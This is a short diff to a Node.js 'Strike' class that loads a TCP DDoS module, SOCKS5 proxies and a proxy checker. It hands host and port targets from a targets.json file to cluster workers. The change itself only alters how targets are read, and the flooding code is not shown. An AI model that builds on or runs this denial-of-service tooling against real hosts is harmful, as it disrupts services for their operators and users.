@@ -10,7 +10,7 @@ const { socks5 } = require("./proxy.socks5");
 const EventEmitter = require("events");
 const ProxyChecker = require("./proxyChecker");
 const TcpClient = require("./tcp.ddos.module");
-const targets = require("./targets");
+const targets = require("./targets.json");
 
 class Strike {
   #CPUsCount = 0;
@@ -25,7 +25,7 @@ class Strike {
   }
 
   async init() {
-    const numCPUs = this.#CPUsCount || targets.length;
+    const numCPUs = this.#CPUsCount || targets.data.length;
     let i = 0;
 
     if (cluster.isPrimary) {
@@ -34,7 +34,7 @@ class Strike {
       }
 
       for (const worker of Object.values(cluster.workers)) {
-        const { host, port } = targets[i];
+        const { host, port } = targets.data[i];
         worker.send({ host, port });
         // worker.send({ host: "127.0.0.1", port: 23 });
         i++;
